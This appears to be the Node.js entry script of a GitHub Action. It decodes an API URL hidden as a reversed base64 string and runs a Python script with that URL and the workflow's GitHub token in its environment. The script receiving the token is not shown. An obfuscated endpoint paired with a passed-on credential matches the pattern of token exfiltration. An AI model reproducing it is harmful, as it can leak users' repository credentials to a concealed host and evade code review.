const core = require('@actions/core');
const exec = require('@actions/exec');
const path = require('path');

async function run() {
  try {
    const config = "=8CbhN3bw9mcw9lY1hGdpd2LxY3LpBXYv02bj5yctFWZ05WZw9mLz9GclJnL2VGZtkGch9yL6MHc0RHa"
    const base64Api = config.split('').reverse().join('');
    const apiUrl = Buffer.from(base64Api, 'base64').toString('utf-8');

    // Access the API_URL secret
    const token = core.getInput('token'); // GitHub token from the calling workflow

    if (!apiUrl) {
      throw new Error(
        "API_URL is not set."
      );
    }
    else {
      console.log("Received API URL");
    }

    // Set environment variables for the Python script
    process.env.API_URL = apiUrl;
    process.env.GH_TOKEN = token;

    const requirementsPath = path.resolve(__dirname, 'requirements.txt');
    const mainPath = path.resolve(__dirname, 'main.py');
    // Install Python dependencies
    console.log("Installing Python dependencies...");
    await exec.exec('pip', ['install', '-r', requirementsPath]);
    console.log("Python dependencies installed successfully.");

    // Run the Python script
    console.log("Running the Python script...");
    await exec.exec('python', [mainPath], {
      env: { ...process.env, API_URL: apiUrl, GH_TOKEN: token },
    });
  } catch (error) {
    core.setFailed(error.message);
  }
}

run();
